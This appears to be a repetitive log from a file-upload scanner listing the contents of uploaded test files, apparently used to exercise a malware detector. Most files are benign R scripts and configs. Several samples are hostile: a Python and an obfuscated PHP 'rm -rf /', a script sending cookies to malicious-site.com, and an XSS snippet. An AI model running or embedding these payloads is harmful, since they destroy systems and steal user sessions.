2025-02-22 20:51:27,604 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:27,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,610 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,612 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:27,614 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:27,615 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:27,618 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:27,619 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,620 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,621 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,622 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,623 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,625 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:27,630 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,631 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,633 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:27,635 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:27,636 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:27,639 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:27,640 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,641 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,643 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,644 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,645 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,646 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:27,651 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,652 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,654 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,655 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,656 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,659 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,660 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,662 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,663 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,664 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,665 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,666 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,669 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,671 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,672 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,673 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,674 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,675 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,676 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,677 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,678 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,679 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,680 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,682 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,683 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,684 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:27,687 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:27,688 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:27,691 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:27,692 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,694 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,695 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,696 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,697 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,698 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:27,704 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,705 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,706 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:27,708 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:27,710 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:27,712 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:27,714 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,715 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,716 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,717 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,718 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,719 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:27,725 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,726 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,727 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:27,730 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:27,731 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:27,733 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:27,736 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,737 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,738 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,740 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,741 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,742 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:27,747 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,748 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,750 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:27,752 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:27,753 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
